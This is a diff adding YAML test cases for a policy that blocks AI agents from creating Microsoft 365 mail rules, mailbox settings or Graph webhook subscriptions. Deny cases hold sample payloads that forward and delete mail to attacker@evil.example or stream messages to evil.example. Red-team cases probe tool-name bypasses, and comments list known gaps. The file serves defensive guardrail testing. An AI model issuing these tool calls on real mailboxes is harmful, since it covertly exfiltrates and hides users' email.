@@ -1,0 +1,360 @@
+# Every deny case asserts the single stable reason string.
+- description: Unrelated mail read tool — reading existing rules is allowed (useful
+    for detection). Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-list-mail-rules
+      uri: null
+    payload:
+      name: ms365-list-mail-rules
+      args: {}
+  output:
+    expectedResult: allow
+- description: Unrelated write tool (send-mail) — outside this policy's job; the
+    external-send and role-gate policies own it. Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-send-mail
+      uri: null
+    payload:
+      name: ms365-send-mail
+      args:
+        body:
+          Message:
+            subject: weekly report
+  output:
+    expectedResult: allow
+- description: create-mail-rule with a hide-and-forward rule body (classic BEC persistence).
+    Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-create-mail-rule
+      uri: null
+    payload:
+      name: ms365-create-mail-rule
+      args:
+        body:
+          displayName: sync
+          sequence: 1
+          actions:
+            forwardTo:
+              - emailAddress:
+                  address: attacker@evil.example
+            delete: true
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: update-mail-rule — rewriting an existing rule is the same persistence
+    surface. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-update-mail-rule
+      uri: null
+    payload:
+      name: ms365-update-mail-rule
+      args:
+        messageRuleId: AQAAA=
+        body:
+          actions:
+            forwardTo:
+              - emailAddress:
+                  address: attacker@evil.example
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: update-mailbox-settings — can enable automatic external forwarding
+    for the whole mailbox. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-update-mailbox-settings
+      uri: null
+    payload:
+      name: ms365-update-mailbox-settings
+      args:
+        body:
+          automaticRepliesSetting:
+            status: alwaysEnabled
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: create-subscription — a Graph change-notification webhook is a standing
+    exfiltration channel. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-create-subscription
+      uri: null
+    payload:
+      name: ms365-create-subscription
+      args:
+        body:
+          changeType: created
+          notificationUrl: https://evil.example/hook
+          resource: /me/messages
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: Mixed-case tool name (MS365-Create-Mail-Rule) — matching is case-insensitive.
+    Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: MS365-Create-Mail-Rule
+      uri: null
+    payload:
+      name: MS365-Create-Mail-Rule
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: create-mail-rule with args missing entirely — the deny is keyed on
+    the tool name alone and fails closed. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-create-mail-rule
+      uri: null
+    payload:
+      name: ms365-create-mail-rule
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: Privileged-looking caller (admin groups claim) is still denied — there
+    is deliberately no group exemption on this surface. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: entra|admin@corp.example
+      claims:
+        groups:
+          - m365-admin
+          - infosec
+    resource:
+      type: tool
+      name: ms365-create-subscription
+      uri: null
+    payload:
+      name: ms365-create-subscription
+      args:
+        body:
+          notificationUrl: https://internal.corp.example/hook
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: delete-mail-rule is NOT this policy's job — freeze-destructive-ops
+    covers deletion surfaces. Policy should allow (attach the companion policy).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-delete-mail-rule
+      uri: null
+    payload:
+      name: ms365-delete-mail-rule
+      args:
+        messageRuleId: AQAAA=
+  output:
+    expectedResult: allow
+- description: update-subscription (extends an existing webhook's lifetime but cannot
+    create one or change its URL) is left to role-gate-writes — documented boundary.
+    Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-update-subscription
+      uri: null
+    payload:
+      name: ms365-update-subscription
+      args:
+        subscriptionId: 7f105c7d-2dc5-4530-97cd-4e7ae6534c07
+  output:
+    expectedResult: allow
+- description: graph-batch reaching the messageRules endpoint does NOT match this
+    policy (known limitation) — deny-graph-batch must be attached alongside. This
+    policy allows it.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-graph-batch
+      uri: null
+    payload:
+      name: ms365-graph-batch
+      args:
+        body:
+          requests:
+            - id: "1"
+              method: POST
+              url: /me/mailFolders/inbox/messageRules
+              body:
+                displayName: sync
+  output:
+    expectedResult: allow
+- description: 'Red-team: bare unprefixed tool name (create-mail-rule, no gateway
+    prefix). Suffix anchoring drops the leading hyphen, so this is still denied.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: create-mail-rule
+      uri: null
+    payload:
+      name: create-mail-rule
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: 'Red-team: gateway that joins the prefix with a dot separator
+    (ms365.create-mail-rule) — no longer bypasses now that anchoring is separator-agnostic.
+    Policy should deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365.create-mail-rule
+      uri: null
+    payload:
+      name: ms365.create-mail-rule
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: 'Red-team: underscore-separator prefix (ms365_create-subscription)
+    also caught by the separator-agnostic suffix. Policy should deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365_create-subscription
+      uri: null
+    payload:
+      name: ms365_create-subscription
+      args:
+        body:
+          notificationUrl: https://evil.example/hook
+  output:
+    expectedResult: deny
+    expectedReason: Mailbox rules, mailbox settings, and Graph change-notification
+      subscriptions must be configured by a human in Outlook or the Microsoft 365
+      admin center — agents are not permitted to create or modify them. This attempt
+      has been flagged for security review. Contact your InfoSec team if you believe
+      this block is a mistake.
+- description: 'Red-team: reauthorize-subscription extends an existing webhook''s
+    lifetime but cannot create a new one or change its URL — left to role-gate-writes
+    (documented boundary). Policy should allow.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-reauthorize-subscription
+      uri: null
+    payload:
+      name: ms365-reauthorize-subscription
+      args:
+        subscriptionId: 7f105c7d-2dc5-4530-97cd-4e7ae6534c07
+  output:
+    expectedResult: allow
+- description: 'Red-team: create-focused-inbox-override plants a standing filter that
+    pins a sender to the Focused/Other tab (weaker hide-mail persistence). It is out
+    of this policy''s explicit scope (mail rules, mailbox settings, subscriptions),
+    so it passes through here — documented Known limitation; gate via role-gate-writes.
+    Policy should allow.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ms365-create-focused-inbox-override
+      uri: null
+    payload:
+      name: ms365-create-focused-inbox-override
+      args:
+        body:
+          senderEmailAddress:
+            address: vendor@partner.example
+          classifyAs: other
+  output:
+    expectedResult: allow
